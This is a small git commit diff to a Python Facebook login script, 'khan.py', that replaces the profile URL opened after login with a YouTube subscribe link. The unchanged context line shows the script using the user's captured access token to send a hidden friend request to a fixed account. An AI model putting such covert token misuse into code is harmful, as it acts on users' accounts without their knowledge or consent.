ce3a30ddc9c62497a54f29639721dd039c423aa2
Komail Khan <64368068+KomailKhan@users.noreply.github.com>
2020-06-22 02:58:43 +0500

    Update khan.py

--- khan.py
+++ khan.py
@@ -187,7 +187,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.Facebook.com/komail.khan.3781')
+				os.system('xdg-open https://www.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ?sub_confirmation=1')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
